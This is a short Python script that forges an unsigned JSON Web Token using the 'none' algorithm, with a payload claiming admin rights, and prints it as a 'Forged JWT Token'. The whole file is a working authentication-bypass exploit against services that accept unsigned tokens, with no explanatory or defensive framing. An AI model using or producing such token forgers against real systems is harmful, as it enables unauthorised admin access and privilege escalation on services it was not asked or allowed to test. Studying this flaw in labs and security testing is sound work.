import base64
import json

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def generate_none_jwt():
    header = {"alg": "none", "typ": "JWT"}
    payload = {"admin": True, "role": "admin"}
    
    header_json = json.dumps(header, separators=(',', ':'))
    payload_json = json.dumps(payload, separators=(',', ':'))
    
    header_b64 = base64url_encode(header_json)
    payload_b64 = base64url_encode(payload_json)
    
    token = f"{header_b64}.{payload_b64}."
    return token

def main():
    try:
        forged_token = generate_none_jwt()
        print(f"Forged JWT Token (none algorithm):")
        print(forged_token)
    except Exception as e:
        print(f"Error generating token: {e}")

if __name__ == "__main__":
    main()